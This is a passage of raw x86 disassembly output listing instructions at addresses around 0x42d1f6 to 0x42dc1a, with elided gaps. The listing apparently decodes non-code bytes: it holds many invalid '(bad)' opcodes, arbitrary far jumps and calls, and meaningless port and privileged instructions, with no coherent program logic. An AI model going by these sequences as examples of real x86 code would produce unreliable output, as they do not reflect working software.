  42d1f6:	add    al,0xc2
  42d1f8:	test   eax,0xcf6777cc
  42d1fd:	inc    edi
  42d1fe:	lahf   
  42d1ff:	jnp    0x42d195
  42d201:	sti    
  42d202:	mov    edi,DWORD PTR [ecx+edx*4+0x79]
  42d206:	mov    ah,ch
  42d208:	retf   0xa59
  42d20b:	out    0x76,al
  42d20d:	mov    edx,0x9c26cc
	...
  42d272:	add    BYTE PTR [eax],al
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d2f8
  42d281:	sub    DWORD PTR [eax+0x6e],0x1d
  42d285:	in     al,0x1
  42d287:	add    BYTE PTR ds:0xb3000001,al
  42d28d:	pop    esp
  42d28e:	inc    ebx
  42d28f:	ret    
  42d290:	dec    eax
  42d291:	xor    eax,0xd0dcbdd7
  42d296:	loope  0x42d30a
  42d298:	or     al,0x54
  42d29a:	mov    edi,0xd2468426
  42d29f:	add    al,0xc0
  42d2a1:	dec    esp
  42d2a2:	and    al,0xef
  42d2a4:	sub    bh,BYTE PTR [ecx]
  42d2a6:	scas   al,BYTE PTR es:[edi]
  42d2a7:	sahf   
  42d2a8:	call   0x6913:0xc4f6d17b
  42d2af:	push   edx
  42d2b0:	fld    TBYTE PTR [edx]
  42d2b2:	pop    esi
  42d2b3:	outs   dx,BYTE PTR ds:[esi]
  42d2b4:	and    eax,0x69f9f774
  42d2b9:	stc    
  42d2ba:	(bad)  
  42d2bb:	(bad)  
  42d2bc:	mov    edi,0xad250a75
  42d2c1:	inc    esp
  42d2c2:	shl    DWORD PTR [edx],cl
  42d2c4:	adc    edx,ebp
  42d2c6:	and    al,0xed
  42d2c9:	ret    0x9b90
  42d2cc:	rcr    BYTE PTR [ebx+0x32],cl
  42d2cf:	mov    esi,0x2a60ea8a
  42d2d4:	and    eax,0xab0dddf
  42d2d9:	in     eax,0x36
  42d2db:	in     eax,0x93
  42d2dd:	das    
  42d2de:	retf   0x846
  42d2e1:	add    esp,DWORD PTR [ecx+0x8a0ece2]
  42d2e7:	push   edi
  42d2e8:	xor    ah,BYTE PTR [esi+esi*4-0x11]
  42d2ec:	and    BYTE PTR [edx],0xcc
  42d2ef:	leave  
  42d2f0:	(bad)  
  42d2f1:	cmp    ch,BYTE PTR [edx-0x6636dd47]
  42d2f7:	pop    esi
  42d2f8:	jae    0x42d294
  42d2fa:	and    ah,BYTE PTR [ebp+eiz*1-0x457db8cb]
  42d301:	pusha  
  42d302:	int3   
  42d303:	push   ss
  42d304:	into   
  42d305:	mov    BYTE PTR [esi],bh
  42d307:	dec    esi
  42d308:	cmpps  xmm0,xmm3,0x60
  42d30c:	mov    DWORD PTR [eax],edi
  42d30e:	add    bh,BYTE PTR [ecx-0x667f1784]
  42d314:	cmc    
  42d315:	int3   
  42d316:	repnz or edx,DWORD PTR [eax-0x41f1dccd]
  42d31d:	adc    DWORD PTR [esp+ebx*1-0x3d6fc8e4],eax
  42d324:	popf   
  42d325:	adc    BYTE PTR [eax+0x56c14c84],dh
  42d32b:	cwde   
  42d32c:	mov    bl,0xc4
  42d32e:	ffreep st(1)
  42d330:	pop    eax
  42d331:	sub    DWORD PTR [esi],ecx
  42d333:	sub    ch,BYTE PTR ds:0xdfd6ed88
  42d339:	cmp    DWORD PTR ds:0x2a2fb654,ebx
  42d33f:	jmp    0xedd4:0xf19304c2
  42d346:	or     DWORD PTR [esi],ebp
  42d348:	lea    edi,[ebx]
  42d34a:	cld    
  42d34b:	nop
  42d34c:	clc    
  42d34d:	push   ebp
  42d34e:	loope  0x42d371
  42d350:	gs mov ch,0x1a
  42d353:	jae    0x42d3ca
  42d355:	jmp    0x42d36e
  42d357:	(bad)  
  42d358:	mov    bl,0xe2
  42d35a:	xchg   ebp,eax
  42d35b:	xchg   DWORD PTR [edx],ecx
  42d35d:	jns    0x42d34f
  42d35f:	pop    ds
  42d360:	loope  0x42d377
  42d362:	inc    ebx
  42d363:	cmc    
  42d364:	and    al,0xce
  42d366:	xor    esp,DWORD PTR [ebp+0x38]
  42d369:	loope  0x42d311
  42d36b:	inc    ebp
  42d36c:	mov    DWORD PTR [ecx-0x31983f14],0x356bb0d5
  42d376:	pusha  
  42d377:	test   eax,0x5e9e1fa5
  42d37c:	call   0xae4f:0x8b77094d
  42d383:	push   edi
  42d384:	xchg   esi,eax
  42d385:	mov    ebp,0xb8f43699
  42d38a:	pop    edi
  42d38b:	adc    esi,esi
  42d38d:	mov    eax,0x94afd0
	...
  42d3f2:	add    BYTE PTR [eax],al
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	stos   BYTE PTR es:[edi],al
  42d401:	out    dx,al
  42d402:	mov    WORD PTR [edx+0x1e522],gs
  42d408:	add    eax,0xc2000001
  42d40d:	(bad)  
  42d40e:	adc    ecx,edi
  42d410:	aas    
  42d411:	inc    ecx
  42d412:	lock fbstp TBYTE PTR [edi+0x26]
  42d416:	mov    DWORD PTR [esi-0x24],0xf7203cbe
  42d41d:	cmp    eax,0xdce336c7
  42d422:	stos   BYTE PTR es:[edi],al
  42d423:	and    BYTE PTR [ebx],cl
  42d425:	mov    es,WORD PTR [edi-0x26]
  42d428:	int    0x1a
  42d42a:	scas   al,BYTE PTR es:[edi]
  42d42b:	iret   
  42d42c:	cdq    
  42d42d:	sar    BYTE PTR ds:0x33dfc750,cl
  42d433:	ficomp DWORD PTR ds:0xaf70209e
  42d439:	mov    al,ds:0xd9187802
  42d43e:	(bad)
  42d441:	fwait
  42d442:	mov    edx,DWORD PTR [edi-0x7bbb35]
  42d448:	cmp    bh,BYTE PTR [ebx]
  42d44a:	inc    ebx
  42d44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d44c:	sub    edx,DWORD PTR [esp+edi*8-0x47]
  42d450:	sub    cl,BYTE PTR [ecx+0x3fcf1464]
  42d456:	ins    DWORD PTR es:[edi],dx
  42d457:	mov    ds:0x2f754af9,al
  42d45c:	int3   
  42d45d:	pop    eax
  42d45e:	xlat   BYTE PTR ds:[ebx]
  42d45f:	mov    edi,0x7d830b10
  42d464:	and    BYTE PTR [esp+edi*4+0x6d722967],cl
  42d46b:	ins    BYTE PTR es:[edi],dx
  42d46c:	mov    eax,ds:0xe4199a35
  42d471:	add    DWORD PTR [edx+edi*4+0x60b491c8],edi
  42d478:	inc    ecx
  42d479:	fst    QWORD PTR [ecx+0x5cdd4160]
  42d47f:	ror    BYTE PTR [ebp-0x2d5654ef],cl
  42d485:	fnsave [edx+0x7828d718]
  42d48b:	ins    DWORD PTR es:[edi],dx
  42d48c:	and    DWORD PTR [ecx+0x5da17f5b],esi
  42d492:	jns    0x42d447
  42d494:	cmc    
  42d495:	pop    edi
  42d496:	jnp    0x42d4b0
  42d498:	mov    ?,WORD PTR [eax]
  42d49a:	aam    0x38
  42d49c:	enter  0x727b,0xd8
  42d4a0:	jl     0x42d487
  42d4a2:	int3   
  42d4a3:	in     eax,dx
  42d4a4:	adc    ch,BYTE PTR [ebp+0x7e]
  42d4a7:	add    al,0x7a
  42d4a9:	cli    
  42d4aa:	add    BYTE PTR [ecx+0x61222b4],ah
  42d4b0:	fcmove st,st(0)
  42d4b2:	daa    
  42d4b3:	(bad)  
  42d4b4:	repnz sbb DWORD PTR [eax],edi
  42d4b7:	push   cs
  42d4b8:	xchg   esi,eax
  42d4b9:	out    dx,eax
  42d4ba:	in     eax,0x31
  42d4bc:	rol    DWORD PTR [eax],cl
  42d4be:	out    0xfc,al
  42d4c0:	pop    ebx
  42d4c1:	fdivr  st,st(4)
  42d4c3:	clc    
  42d4c4:	repz cmp eax,0x70351425
  42d4ca:	push   0x64
  42d4cc:	sub    al,0xc0
  42d4ce:	mov    dh,0x55
  42d4d0:	out    0x2b,al
  42d4d2:	hlt    
  42d4d3:	lea    ebp,[ebx+0x147144d4]
  42d4d9:	cmc    
  42d4da:	xor    ebp,DWORD PTR [ecx-0x77]
  42d4dd:	and    ch,0xde
  42d4e0:	sbb    esp,ebp
  42d4e2:	je     0x42d532
  42d4e4:	iret   
  42d4e5:	inc    edi
  42d4e6:	test   al,ah
  42d4e8:	push   0x6657e451
  42d4ed:	xor    BYTE PTR [eax+0x766b7dff],0x9f
  42d4f4:	mov    esp,0x79ba94d0
  42d4f9:	sti    
  42d4fa:	mov    ebp,0x2e689978
  42d4ff:	push   esp
  42d500:	sbb    DWORD PTR [edx],edi
  42d502:	loopne 0x42d520
  42d504:	int    0x88
  42d506:	cld    
  42d507:	std    
  42d508:	repz mov eax,ds:0x236a5c57
  42d50e:	cmp    ebx,ecx
  42d510:	push   ss
	...
  42d571:	add    BYTE PTR [eax],al
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0x4ea158d5,eax
  42d583:	cmp    BYTE PTR [edi],ah
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0x77000001,al
  42d58d:	lock jo 0x42d549
  42d590:	xchg   ebx,eax
  42d591:	(bad)  
  42d592:	push   ds
  42d593:	popf   
  42d594:	pop    esi
  42d595:	imul   eax,DWORD PTR [ebx-0x645bac29],0x54
  42d59c:	pusha  
  42d59d:	jp     0x42d613
  42d59f:	fimul  WORD PTR [esi+0x19ba76e0]
  42d5a5:	les    esi,FWORD PTR [ecx+0x4b]
  42d5a8:	pusha  
  42d5a9:	mov    bl,0x39
  42d5ab:	cmc    
  42d5ac:	popf   
  42d5ad:	jmp    0xedbc:0x798fbd74
  42d5b4:	fdivr  DWORD PTR [ebp+0x1374f40d]
  42d5ba:	mov    ebp,0x83a41a6d
  42d5bf:	mov    ds:0xd39971bb,al
  42d5c4:	add    edx,edi
  42d5c6:	pop    esp
  42d5c7:	call   0x6c31d863
  42d5cc:	repnz sub bl,cl
  42d5cf:	(bad)  
  42d5d0:	outs   dx,BYTE PTR ds:[esi]
  42d5d1:	mov    ds:0xa3dd5648,eax
  42d5d6:	and    al,0x17
  42d5d8:	push   ebx
  42d5d9:	sbb    edi,esp
  42d5db:	sbb    eax,0x5215dcfb
  42d5e0:	dec    ecx
  42d5e1:	fld    QWORD PTR [edi-0x795d8d77]
  42d5e7:	cmp    BYTE PTR [esi+edx*8],dl
  42d5ea:	imul   esp,DWORD PTR [esi+0x1c],0xffffffff
  42d5ee:	test   DWORD PTR [ecx],ebp
  42d5f0:	out    0xbb,al
  42d5f2:	sub    dh,ah
  42d5f4:	and    eax,0xe6a407c3
  42d5f9:	dec    edi
  42d5fa:	sub    al,0x2
  42d5fc:	add    al,0x45
  42d5fe:	ds push ebp
  42d600:	adc    eax,DWORD PTR [ecx+0x3090c3a4]
  42d606:	fsubr  DWORD PTR [eax+0x25]
  42d609:	xlat   BYTE PTR ds:[ebx]
  42d60a:	mov    ecx,ds
  42d60c:	mov    dl,BYTE PTR [eax+0x7]
  42d60f:	and    ebp,ebp
  42d611:	sbb    al,0x1b
  42d613:	out    dx,al
  42d614:	aas    
  42d615:	sbb    eax,0x772b87cd
  42d61a:	scas   al,BYTE PTR es:[edi]
  42d61b:	add    DWORD PTR [eax],esi
  42d61d:	xor    DWORD PTR [bx+di+0x57d9],esi
  42d622:	cmp    dh,BYTE PTR [esi-0x49]
  42d625:	mov    ah,BYTE PTR [edi-0x45]
  42d628:	mov    ecx,0x1c1fc7b3
  42d62d:	mov    edi,0x21a05c13
  42d632:	mov    DWORD PTR [edi],ebx
  42d634:	xchg   edi,eax
  42d635:	out    0xe0,eax
  42d637:	call   0x58441520
  42d63c:	(bad)  
  42d63d:	rcl    BYTE PTR [edi],1
  42d63f:	ss cmp al,dl
  42d642:	xchg   esi,eax
  42d643:	jns    0x42d65a
  42d645:	(bad)  
  42d646:	jmp    0x42d674
  42d648:	and    al,0x24
  42d64a:	call   0xde1c:0xd3defc80
  42d651:	and    dl,bh
  42d653:	ja     0x42d645
  42d655:	xchg   esp,eax
  42d656:	adc    dl,BYTE PTR fs:[edx+ebp*8+0x2c462cf7]
  42d65e:	call   0xdd122f14
  42d663:	(bad)  
  42d664:	push   eax
  42d665:	adc    al,BYTE PTR [edi]
  42d667:	out    0xdf,eax
  42d669:	retf   0x9cec
  42d66c:	xchg   edi,eax
  42d66d:	pushf  
  42d66e:	and    ebp,ecx
  42d670:	test   al,0x1e
  42d672:	aaa    
  42d673:	imul   eax,DWORD PTR [ebp+edi*4-0x1c5982a1],0xee3d64de
  42d67e:	loopne 0x42d638
  42d680:	and    ch,BYTE PTR [edx-0x6]
  42d683:	loopne 0x42d622
  42d685:	test   al,0xf0
  42d687:	shr    DWORD PTR [edx+0x33d3261d],0x26
  42d68e:	and    al,0xbb
  42d690:	pop    ds
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x32
  42d701:	(bad)  
  42d702:	sub    edi,DWORD PTR [ebx]
  42d704:	sub    al,0xe7
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0xd1000001
  42d70d:	sahf   
  42d70e:	int    0x46
  42d710:	pop    ecx
  42d711:	mov    bh,0xbd
  42d713:	ss in  eax,0x93
  42d716:	aas    
  42d717:	call   0xee8b9e4d
  42d71c:	push   es
  42d71d:	sbb    eax,0xbf6a9af7
  42d722:	xchg   DWORD PTR [edi-0x4b29aa13],eax
  42d728:	pop    edx
  42d729:	fnstcw WORD PTR [edi-0x1b]
  42d72c:	hlt    
  42d72d:	xchg   edx,eax
  42d72e:	(bad)  
  42d72f:	and    ebx,DWORD PTR [esi]
  42d731:	cmp    DWORD PTR [edi+eax*8+0x4fbe857e],ebp
  42d738:	xor    ebp,DWORD PTR [edi-0x62]
  42d73b:	dec    esp
  42d73c:	retf   
  42d73d:	in     al,0xc3
  42d73f:	test   DWORD PTR [ebx+edx*2+0x6f119cb5],esi
  42d746:	pop    edx
  42d747:	xchg   esi,eax
  42d748:	ja     0x42d7c6
  42d74a:	hlt    
  42d74b:	popa   
  42d74c:	inc    ecx
  42d74d:	push   esp
  42d74e:	call   0xe17a:0x167dd52
  42d755:	mov    ?,WORD PTR [eax-0x72]
  42d758:	mov    ss,WORD PTR [esi-0x63]
  42d75b:	jmp    0x45c2:0xbd39e4d1
  42d762:	repnz out 0xdc,eax
  42d765:	gs jmp 0x42d797
  42d768:	xor    ecx,DWORD PTR [ebp+0x30]
  42d76b:	fiadd  WORD PTR [edi+0x1]
  42d76e:	dec    ebp
  42d76f:	add    al,0x6c
  42d771:	scas   eax,DWORD PTR es:[edi]
  42d772:	std    
  42d773:	and    ebp,DWORD PTR [edi-0x362f2aac]
  42d779:	ins    BYTE PTR es:[edi],dx
  42d77a:	rol    DWORD PTR gs:[ebp-0x42e65fc0],cl
  42d781:	jno    0x42d800
  42d783:	aaa    
  42d784:	mov    al,0xb8
  42d786:	rcr    esi,cl
  42d788:	fdivr  QWORD PTR [ebp+0x1e]
  42d78b:	sub    DWORD PTR cs:[ecx-0x5e],ebp
  42d78f:	dec    esp
  42d790:	sbb    DWORD PTR [edi],esp
  42d792:	xor    eax,esi
  42d794:	test   edx,ebp
  42d796:	add    al,0xea
  42d798:	or     ah,BYTE PTR [edi+0x3a]
  42d79b:	call   0xe1ed:0xfef48f65
  42d7a2:	sahf   
  42d7a3:	lea    ebx,[edi+0x6b55d651]
  42d7a9:	enter  0x83b6,0x4d
  42d7ad:	int    0xcb
  42d7af:	out    dx,eax
  42d7b0:	gs adc ebx,ebp
  42d7b3:	xor    cl,cl
  42d7b5:	sti    
  42d7b6:	add    al,0x25
  42d7b8:	jae    0x42d792
  42d7ba:	mov    BYTE PTR [edx+0x6d],dl
  42d7bd:	xchg   ebp,eax
  42d7be:	cld    
  42d7bf:	cdq    
  42d7c0:	ror    DWORD PTR [edx],1
  42d7c2:	shl    BYTE PTR [eax+eiz*2+0x9],cl
  42d7c6:	push   0xfffffffe
  42d7c8:	adc    BYTE PTR [ebp-0x4bffa335],dl
  42d7ce:	out    0x8e,al
  42d7d0:	add    al,0xe1
  42d7d2:	clc    
  42d7d3:	xchg   ebx,eax
  42d7d4:	sbb    DWORD PTR [ebx+0x32],ebx
  42d7d7:	pop    ebx
  42d7d8:	mov    esi,0x384c2e9c
  42d7dd:	fidivr WORD PTR [edi-0x78]
  42d7e0:	popf   
  42d7e1:	push   ebp
  42d7e2:	xchg   ecx,eax
  42d7e3:	sub    DWORD PTR ds:0x7c4d2ca5,0x31
  42d7ea:	push   edx
  42d7eb:	push   esi
  42d7ec:	not    DWORD PTR [edi+0x673ea152]
  42d7f2:	push   esp
  42d7f3:	jmp    0x74ec:0x2f9a080b
  42d7fa:	jbe    0x42d7f0
  42d7fc:	or     edx,DWORD PTR [edi+0xb65f69c]
  42d802:	mov    al,0x52
  42d804:	call   0xe225:0x6dc902d2
  42d80b:	mov    esi,0x370daf50
  42d810:	sbb    BYTE PTR [eax],al
	...
  42d872:	add    BYTE PTR [eax],al
  42d874:	xchg   esi,eax
  42d875:	fwait
  42d876:	cwde   
  42d877:	pop    edi
  42d878:	popf   
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x27c6961a
  42d881:	xor    BYTE PTR [ecx],ah
  42d883:	push   esi
  42d884:	xor    eax,ebp
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    eax,0xfd000001
  42d88d:	fs pusha 
  42d88f:	pop    esp
  42d890:	jbe    0x42d89e
  42d892:	jecxz  0x42d853
  42d894:	sub    al,0xc0
  42d896:	stos   DWORD PTR es:[edi],eax
  42d897:	xor    cl,ch
  42d899:	sbb    BYTE PTR [edi+0x7a],0xbb
  42d89d:	mov    edi,0x4e2fd212
  42d8a2:	pop    edi
  42d8a3:	js     0x42d8e2
  42d8a5:	add    DWORD PTR [ebx],edi
  42d8a7:	(bad)  
  42d8a8:	out    0xac,eax
  42d8aa:	outs   dx,BYTE PTR ds:[esi]
  42d8ab:	std    
  42d8ac:	cwde   
  42d8ad:	stos   DWORD PTR es:[edi],eax
  42d8ae:	pop    ecx
  42d8af:	xor    eax,0x63c74f9c
  42d8b4:	push   ss
  42d8b5:	adc    DWORD PTR [edx],ebp
  42d8b7:	mov    bh,0x88
  42d8b9:	inc    edi
  42d8ba:	lock adc BYTE PTR ss:[ebp+0x66d0581b],dh
  42d8c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8c3:	push   0x7e391295
  42d8c8:	mov    cl,0x75
  42d8ca:	mov    WORD PTR [eax+0x480a0429],?
  42d8d0:	mov    bl,0xf5
  42d8d2:	cdq    
  42d8d3:	inc    edx
  42d8d4:	imul   eax,DWORD PTR [edi-0x40],0x5ff7bf76
  42d8db:	or     BYTE PTR [ebx],bl
  42d8dd:	pushf  
  42d8de:	test   esi,esp
  42d8e0:	xlat   BYTE PTR ds:[ebx]
  42d8e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d8e2:	mov    bl,0xa6
  42d8e4:	call   0x2fa497f1
  42d8e9:	leave  
  42d8ea:	pop    edi
  42d8eb:	pop    edx
  42d8ec:	cmp    dl,0x11
  42d8ef:	dec    eax
  42d8f0:	retf   0x7822
  42d8f3:	xor    esi,ecx
  42d8f5:	int3   
  42d8f6:	inc    eax
  42d8f7:	jno    0x42d886
  42d8f9:	or     DWORD PTR [edi+0x49],ecx
  42d8fc:	add    eax,0xe3906e1b
  42d901:	mul    BYTE PTR [ecx+0x3cdfad5d]
  42d907:	adc    bh,al
  42d909:	sbb    al,0xbe
  42d90b:	xor    BYTE PTR [esi+0x11b6bcd1],cl
  42d911:	dec    esi
  42d912:	lods   al,BYTE PTR ds:[esi]
  42d913:	scas   eax,DWORD PTR es:[edi]
  42d914:	add    eax,0xaa6e0915
  42d919:	xchg   cl,al
  42d91b:	jg     0x42d8c5
  42d91d:	mov    esp,0x5e83d580
  42d922:	jne    0x42d901
  42d924:	xchg   DWORD PTR [ebp-0x66],ebx
  42d927:	sub    eax,0xbd6096d2
  42d92c:	test   eax,0xb352216b
  42d931:	lea    ebp,[esi+0x1aed8b06]
  42d937:	nop
  42d938:	and    al,0x2f
  42d93a:	cmp    ebx,DWORD PTR [ebp+0x26ffa474]
  42d940:	pop    es
  42d941:	dec    ebx
  42d942:	jnp    0x42d97e
  42d944:	mov    bh,0x71
  42d946:	mov    edx,0x6f55dd02
  42d94b:	push   ebx
  42d94c:	mov    cl,0xd7
  42d94e:	xchg   BYTE PTR [edi+ebx*8],bl
  42d951:	test   DWORD PTR ds:0x7fe794ab,eax
  42d957:	adc    DWORD PTR [edi-0x3e974ae],eax
  42d95d:	out    dx,al
  42d95e:	adc    al,0x39
  42d960:	fwait
  42d961:	in     al,0xe4
  42d963:	aad    0x20
  42d965:	iret   
  42d966:	push   DWORD PTR [edi]
  42d968:	push   ss
  42d969:	fwait
  42d96a:	dec    eax
  42d96b:	pop    esp
  42d96c:	ja     0x42d9eb
  42d96e:	and    al,0xcd
  42d970:	sbb    BYTE PTR [ebp+0x1f22825e],bl
  42d976:	inc    edi
  42d977:	mov    al,ds:0x9655d9b
  42d97c:	test   eax,0x9644af13
  42d981:	pop    edi
  42d982:	js     0x42d961
  42d984:	push   0xfffffff1
  42d986:	xor    edx,DWORD PTR [ebp+0x31285bad]
  42d98c:	pushf  
  42d98d:	(bad)  
  42d98e:	mov    gs,WORD PTR [edx]
  42d990:	test   BYTE PTR [eax],0x0
	...
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	repz sbb DWORD PTR [ebx],ebp
  42da03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da04:	ss jmp 0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	push   eax
  42da0d:	retf   
  42da0e:	mov    WORD PTR ds:0xcc4c6709,es
  42da14:	inc    esi
  42da15:	and    al,ah
  42da17:	push   0x10cd6d1b
  42da1c:	adc    al,BYTE PTR [ebx]
  42da1e:	rcl    cl,cl
  42da20:	jp     0x42da82
  42da22:	rcl    DWORD PTR [edi-0x7c],cl
  42da25:	mov    bl,0xae
  42da27:	push   es
  42da28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da29:	pop    ss
  42da2a:	jle    0x42d9c1
  42da2c:	sub    DWORD PTR ds:0xdbea0c07,edx
  42da32:	pusha  
  42da33:	and    ecx,esi
  42da35:	cmp    BYTE PTR [edi],ch
  42da37:	and    BYTE PTR [ebx-0x45],dl
  42da3a:	test   eax,0x7e7ccc33
  42da3f:	fcomp  QWORD PTR [edi]
  42da41:	mov    dl,0x7e
  42da43:	dec    esi
  42da44:	arpl   WORD PTR [eax],bp
  42da46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da47:	adc    DWORD PTR [ebx-0x79],edi
  42da4a:	fdiv   DWORD PTR [eax]
  42da4c:	sub    DWORD PTR [edi+0x67],ecx
  42da4f:	cmp    al,0x48
  42da51:	jae    0x42da6f
  42da53:	in     eax,0xf
  42da55:	nop
  42da56:	and    bh,BYTE PTR [ebx+0x3d292bc5]
  42da5c:	aam    0xb9
  42da5e:	cmc    
  42da5f:	push   esi
  42da60:	les    esi,FWORD PTR [eax+0x4a07efd7]
  42da66:	repz xlat BYTE PTR ds:[ebx]
  42da68:	data16 stc 
  42da6a:	out    dx,al
  42da6b:	inc    eax
  42da6c:	mov    dh,0x6d
  42da6e:	push   ecx
  42da6f:	dec    edi
  42da70:	pop    edx
  42da71:	mov    ebx,0x2202f28a
  42da76:	pop    edx
  42da77:	inc    ecx
  42da78:	fist   DWORD PTR ds:0x33b55a62
  42da7e:	jmp    0x3ca8:0xe1b1d3c5
  42da85:	into   
  42da86:	jns    0x42da9c
  42da88:	outs   dx,BYTE PTR ds:[esi]
  42da89:	mov    dl,0x1a
  42da8b:	nop
  42da8c:	(bad)  
  42da8d:	mov    ah,0x20
  42da8f:	xchg   edx,eax
  42da90:	sar    BYTE PTR [edx],1
  42da92:	jle    0x42db0b
  42da94:	loopne 0x42dad6
  42da96:	cmp    ah,BYTE PTR [ebx-0xa285542]
  42da9c:	pop    edx
  42da9d:	std    
  42da9e:	cmp    bh,dl
  42daa0:	dec    ebx
  42daa1:	sti    
  42daa2:	test   DWORD PTR [esi],ebp
  42daa4:	or     al,0x98
  42daa6:	js     0x42daed
  42daa8:	mov    dl,0x62
  42daaa:	pop    ebp
  42daab:	cmp    esp,DWORD PTR [ecx]
  42daad:	(bad)  
  42daaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dab0:	les    edi,FWORD PTR [edx-0x50ebee8a]
  42dab6:	push   esp
  42dab7:	iret   
  42dab8:	pop    es
  42dab9:	es cwde 
  42dabb:	ins    BYTE PTR es:[edi],dx
  42dabc:	pushf  
  42dabd:	pusha  
  42dabe:	aad    0xf0
  42dac0:	scas   al,BYTE PTR es:[edi]
  42dac1:	clc    
  42dac2:	call   0x545a7b29
  42dac7:	sub    BYTE PTR [ecx-0x4b31c706],cl
  42dacd:	ds fxch st(7)
  42dad0:	(bad)  
  42dad1:	mov    DWORD PTR [ebx],edx
  42dad3:	adc    edx,edx
  42dad5:	or     DWORD PTR [ecx+0x32],ebp
  42dad8:	rcl    BYTE PTR [edx-0x3421e8a3],1
  42dade:	xor    al,0xd1
  42dae0:	mov    esi,0x1ce4241e
  42dae5:	and    bl,BYTE PTR [edx+0x5515c3f]
  42daeb:	jle    0x42dabb
  42daed:	jb     0x42db4c
  42daef:	inc    esi
  42daf0:	fld    TBYTE PTR [ebx+0x73184bf1]
  42daf6:	fistp  WORD PTR [edi+0x6e]
  42daf9:	fdiv   st,st(0)
  42dafb:	add    al,0x29
  42dafd:	sub    DWORD PTR [esp+ecx*8-0x49],esp
  42db01:	lods   al,BYTE PTR ds:[esi]
  42db02:	ss pop ebx
  42db04:	aaa    
  42db05:	nop
  42db06:	rol    dh,1
  42db08:	jp     0x42da90
  42db0a:	repnz loop 0x42db54
  42db0d:	mov    edi,0x10b8e5
	...
  42db72:	add    BYTE PTR [eax],al
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db9d
  42db81:	(bad)  
  42db82:	mov    bl,0xc6
  42db84:	cmp    ebp,edx
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    eax,0x1a000001
  42db8d:	pop    edi
  42db8e:	stos   DWORD PTR es:[edi],eax
  42db8f:	add    BYTE PTR [ebp-0x60],0x6f
  42db93:	call   0x45c4ce87
  42db98:	pop    esp
  42db99:	pop    ebx
  42db9a:	push   cs
  42db9b:	mov    ebx,0xbca8f3b9
  42dba0:	stos   DWORD PTR es:[edi],eax
  42dba1:	mov    eax,0xb99d4a8
  42dba6:	loope  0x42db71
  42dba8:	cld    
  42dba9:	xchg   esp,eax
  42dbaa:	xchg   ebx,eax
  42dbab:	mov    al,0x17
  42dbad:	out    0xbe,eax
  42dbaf:	hlt    
  42dbb0:	cmp    DWORD PTR [eax+0x35],esp
  42dbb3:	pushf  
  42dbb4:	push   0x60349354
  42dbb9:	rcl    eax,cl
  42dbbb:	inc    edx
  42dbbc:	and    ebx,DWORD PTR [edi-0x1f1f4462]
  42dbc2:	rcr    bl,cl
  42dbc4:	pop    esp
  42dbc5:	sti    
  42dbc6:	in     al,0x9e
  42dbc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbc9:	add    eax,0xdc8029a6
  42dbce:	cmp    eax,0xf4812f9c
  42dbd3:	cmp    dh,BYTE PTR [edx-0x39defbf3]
  42dbd9:	inc    edx
  42dbda:	stos   DWORD PTR es:[edi],eax
  42dbdb:	pop    es
  42dbdc:	stos   DWORD PTR es:[edi],eax
  42dbdd:	(bad)  
  42dbde:	xchg   edx,eax
  42dbdf:	xor    ebx,DWORD PTR [ebx+edx*2]
  42dbe2:	pop    edi
  42dbe3:	fistp  QWORD PTR [ebp-0x4aa6c114]
  42dbe9:	cwde   
  42dbea:	retf   
  42dbeb:	add    BYTE PTR [ebx-0x7a],ch
  42dbee:	sbb    bl,BYTE PTR [esi]
  42dbf0:	mov    edi,0xf0793e7f
  42dbf5:	lods   eax,DWORD PTR ds:[esi]
  42dbf6:	push   0x6e
  42dbf8:	loop   0x42db9f
  42dbfa:	xchg   DWORD PTR [edx-0x273a1354],ecx
  42dc00:	cmp    al,0xd6
  42dc02:	(bad)  
  42dc04:	int3   
  42dc05:	int3   
  42dc06:	(bad)  
  42dc07:	mov    esp,0x51cb6ac9
  42dc0c:	scas   eax,DWORD PTR es:[edi]
  42dc0d:	std    
  42dc0e:	fsubr  DWORD PTR [esi-0x5b5a3b31]
  42dc14:	scas   eax,DWORD PTR es:[edi]
  42dc15:	int    0x87
  42dc17:	lahf   
  42dc18:	xchg   ecx,eax
  42dc19:	xchg   ecx,eax
  42dc1a:	jmp    0x42dbbb
